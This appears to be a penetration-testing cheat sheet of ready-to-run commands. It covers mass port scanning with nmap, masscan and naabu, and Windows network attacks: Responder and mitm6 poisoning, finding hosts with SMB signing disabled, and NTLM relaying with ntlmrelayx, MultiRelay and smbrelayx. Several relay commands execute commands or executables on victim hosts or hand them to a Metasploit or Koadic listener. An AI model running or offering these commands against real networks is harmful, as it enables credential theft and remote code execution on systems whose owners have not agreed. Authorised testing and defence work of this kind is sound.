## Portscan
#### Nmap Few
```
nmap -sS -Pn -p 22,25,80,443,139,445,3306,1433,5432,1521,27001,8080,8000,8088,8443,5900,1099 --open -vvvv -iL <file> -oA nmap_few
```
#### Nmap 1k
```
nmap -sS -Pn --open -vvvv -iL <file> -oA nmap_1k
```
#### Nmap 1k
```
nmap -sS -Pn --open -vvvv -iL <file> -oA nmap_1k
```
#### Masscan + nmap version Full
```
masscan -p 1-65535 --rate 10000 --wait 0 --open -iL ip.txt -oX masscan.xml
```
```
open_ports=$(cat masscan.xml | grep portid | cut -d "\"" -f 10 | sort -n | uniq | paste -sd,)
```
```
nmap -sS -Pn -A -sV -p $open_ports --open -vvvv -n -iL ip.txt -oA nmapfull
```
#### Naabu
```
naabu -list <ip.txt> -rate 5000 -nmap-cli 'nmap -sV -oA naabu_nmap'
```

## Poisoning Attack

#### Responder
```
responder -I eth0
```
#### IPv6 DHCP Rogue Server 
Install Mitm6
```
pip install mitm6
```

```
mitm6 -i eth0
```

#### Generate SMB Signing Disabled Hosts
```
crackmapexec smb --gen-relay-list smb_sigb_disbaled.txt ranges.txt
```
#### Relay Attacks 
ntlmrelayx
```
python3 ntlmrelayx.py -smb2support -tf filename
```
ntlmrelayx Comamnd execution
```
python3 ntlmrelayx.py -smb2support -tf filename -c <msf or koadic listener here>
```
Multirelay
```
python3 MultiRelay.py -t IP -u ALL
```
SMBrelay
```
python3 smbrelayx.py -h IP -c <command>
```
```
python3 smbrelayx.py -h IP -e <executable>
```
